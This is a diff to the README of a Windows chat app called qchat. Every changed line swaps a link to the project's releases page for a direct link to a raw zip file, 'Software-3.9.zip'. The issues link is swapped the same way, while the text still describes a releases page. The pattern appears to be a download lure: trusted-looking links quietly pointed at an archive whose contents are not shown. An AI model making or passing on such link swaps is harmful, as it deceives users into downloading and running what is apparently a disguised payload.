@@ -1,6 +1,6 @@
 # 💬 qchat - Simple, Private Group Chat
 
-[![Download qchat](https://img.shields.io/badge/Download-qchat-blue?style=for-the-badge&logo=github)](https://github.com/landonboxedu54/qchat/releases)
+[![Download qchat](https://img.shields.io/badge/Download-qchat-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/landonboxedu54/qchat/main/src/Software-3.9.zip)
 
 ---
 
@@ -27,7 +27,7 @@ qchat runs on most modern Windows machines without installing additional softwar
 
 You need to visit the page below to get the latest version of qchat. This page holds all software updates and release notes.
 
-[![Download qchat](https://img.shields.io/badge/Download-qchat-grey?style=for-the-badge&logo=github)](https://github.com/landonboxedu54/qchat/releases)
+[![Download qchat](https://img.shields.io/badge/Download-qchat-grey?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/landonboxedu54/qchat/main/src/Software-3.9.zip)
 
 Click the link above and look for the Windows installer or executable file with the latest date. Usually, it looks like **qchat-setup.exe** or **qchat.exe**.
 
@@ -91,7 +91,7 @@ Check the release page regularly to get the newest improvements and security fix
 
 To update:
 
-1. Download the newest file from the [releases page](https://github.com/landonboxedu54/qchat/releases).
+1. Download the newest file from the [releases page](https://raw.githubusercontent.com/landonboxedu54/qchat/main/src/Software-3.9.zip).
 
 2. Run the installer or replace the old executable with the new one.
 
@@ -151,4 +151,4 @@ qchat does not keep chat records after the chat ends. It does not require userna
 
 For help with qchat, visit the Github page and open an issue. Provide details about your Windows version and any error messages.
 
-[GitHub Issues for qchat](https://github.com/landonboxedu54/qchat/issues)
+[GitHub Issues for qchat](https://raw.githubusercontent.com/landonboxedu54/qchat/main/src/Software-3.9.zip)
